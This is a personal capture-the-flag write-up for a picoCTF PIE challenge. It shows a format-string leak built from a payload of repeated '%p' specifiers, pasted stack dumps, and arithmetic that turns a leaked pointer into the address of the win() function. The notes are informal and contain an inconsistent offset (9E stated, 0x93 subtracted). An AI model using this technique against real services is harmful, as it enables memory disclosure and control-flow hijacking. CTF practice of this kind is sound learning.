---
topic:
course:
tags:
  - ctf
  - picoctf
  - binaryexploitation
  - medium
  - complete
created: 06-02-2026 11:24
modified: 08-02-2026 15:02
aliases:
---

Given
![[_images/vuln]]

![[vuln.c]]

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```
Upon inspection of the cosde, we see the same setup as the first pie time, except the main method is shortened and instead ;uses the callfunction method for the user input.

In the callfunction method, there is the same pattern of retreiving user inpout and using it to run as a function or something

But the difference in this code is the use of the [[fgets()]] method, and doesnt print the address of the main function, so there is no way of knowing the prefix of the main function. So we can't use the nm method like the first time.
![[Pasted image 20260206113519.png]]
First thoughts is that we have to somehow use the name process to reveal some information about the main function, from there we would be able to do the previous pie time exploit.

Which is confirmed by the first hint - 
![[Pasted image 20260206113731.png]]

Quick google search leads me to the format string attack, to try and leak the address from the buffer.
https://owasp.org/www-community/attacks/Format_string_attack

**Table 2. Common parameters used in a Format String Attack.**

| Parameters | Output                                         | Passed as |
| ---------- | ---------------------------------------------- | --------- |
| %%         | % character (literal)                          | Reference |
| %p         | External representation of a pointer to void   | Reference |
| %d         | Decimal                                        | Value     |
| %c         | Character                                      |           |
| %u         | Unsigned decimal                               | Value     |
| %x         | Hexadecimal                                    | Value     |
| %s         | String                                         | Reference |
| %n         | Writes the number of characters into a pointer | Reference |

Looks like we can abuse the unsafe way the printf function is used, by inputting certain string literals, we can outpout the contents of the stack:
![[Pasted image 20260206114345.png]]

Not sure what to do with the output or how to make sense of it

![[Pasted image 20260206114620.png]]
![[Pasted image 20260206114707.png]]
seems to be some reoccuring output
`fbad2288`

use of `%p` makes a bit more sense
![[Pasted image 20260206114908.png]]
Seems like the most we can get is
![[Pasted image 20260206115100.png]]
```c
0x55acf967a2a1
0xfbad2288
0x7fff0fb60fc0
(nil)
(nil)
0x7f808b00cfd0
(nil)
0x7025702570257025
0x70257025702570255
0x7025702570257025
0x25702570257025
0x7fff0fb61020
0x5851fb189560e900
0x7fff0fb61020
0x55acefc85441
0x1
0x7f861138
0x75a76f2c946a2187
(nil)
0x7fff0f
```
Raw memory values - hexadecimal pointer values
```c
0x55e7af24d2a1
0xfbad2288
0x50db2d5f
0x55e7af24d2c5
(nil)
0x7f5140755fd0
(nil)
0x7025702570257025
0x7025702570257025
0x7025702570257025
0x7025702570257025
0xa50257025
0x57c0f6ef09ed2e00
(nil)
0x7ffcdb70c6b8
0x7ffcdb70c5a0
0x57c0f6ef09ed2e00
```
Could I print the contents of one of these pointers by using the address?
`0x55acf967a2a1`


For displaying data from the stack, it is convenient to use the formatting parameter `%08x`, which displays the stack values as hexadecimal numbers aligned at eight places. In the example below, the function assumes that four parameters are stored on the stack:

%08x%08x%08x%08x
%08x%08x%08x%08x

So we want to read this address 0x55acf967a2a1
remove 0x - hex specifier
group into pairs of bytes
55 ac f9 67 a2 a1
reverse for [[little endian]]
a1 a2 67 f9 ac 55
conver into \x format by appending \x as a prefix to each byte
\xa1\xa2\x67\xf9\xac\x55 - then thats our address  we want to inject

Make sure to pad it to 8 bytes - since our address is only 6 bytes - we add two \x00's on the end
\xa1\xa2\x67\xf9\xac\x55\x00\x00

Anaylsing the two dumps

```c
0x55acf967a2a1
0xfbad2288
0x7fff0fb60fc0
(nil)
(nil)
0x7f808b00cfd0
(nil)
0x7025702570257025
0x70257025702570255
0x7025702570257025
0x25702570257025
0x7fff0fb61020
0x5851fb189560e900
0x7fff0fb61020
0x55acefc85441
0x1
0x7f861138
0x75a76f2c946a2187
(nil)
0x7fff0f
```

```c
0x55e7af24d2a1
0xfbad2288
0x50db2d5f
0x55e7af24d2c5
(nil)
0x7f5140755fd0
(nil)
0x7025702570257025
0x7025702570257025
0x7025702570257025
0x7025702570257025
0xa50257025
0x57c0f6ef09ed2e00
(nil)
0x7ffcdb70c6b8
0x7ffcdb70c5a0
0x57c0f6ef09ed2e00
```

key
``` 
0x55...        → program text / heap (PIE binary)
0x7f...        → libc / shared libraries
0x7fff...      → stack
0xfbad2288     → glibc FILE flags (not a pointer)
0x70257025...  → ASCII of "%p%p%p%p"
```


another run
```c
0x5624541a92a1
0xfbad2288 - always the same
0x7ffe1247c9b0
(nil)
(nil)
0x7f40531a6fd0
(nil)
0x7025702570257025 - %p values on the stack (Was about 5 of them deleted)
0x25702570257025
0x7ffe1247ca10
0x68e2a796d026cc00
0x7ffe1247ca10
0x56242b3db441
0x1
0x7f4052feaca8
0x7ffe1247cb10
0x56242b3db400
0x12b3da040
0x7ffe1247cb28
0x7ffe1247cb28
0x72f9c6bbd6b642df
(nil)
0x7ffe12
```

0xfbad2288
fb ad 22 88 
\x88\x22\xad\xfb\x00\x00\x00\x00 - I want to access this memoery location which is always the same
trying with 
"\x88\x22\xad\xfb\x00\x00\x00\x00 %s"
then
\x88\x22\xad\xfb\x00\x00\x00\x00 %7$s

https://hackinglab.cz/en/blog/format-string-vulnerability/


payload
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
21 p - to leak all of the memory addresses without seg faulting

![[Pasted image 20260206125605.png]]

THird last address leaked always points to a part of the main function

Use hex calc to calc the offset of the leakd address and the internal one

main address -  0x0000555555555319
win address - 0x000055555555527b
![[Pasted image 20260206130156.png]]

offset - 9E - from memory address of main to win function
so we just have to run the payload again, take the third last memory address and subtract the offset, then enter that address into the code to be executed

%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
main() 0x64bc3b98b441 - 0x93 = 64BC3B98B3A3

enter 0x64BC3B98B3A3
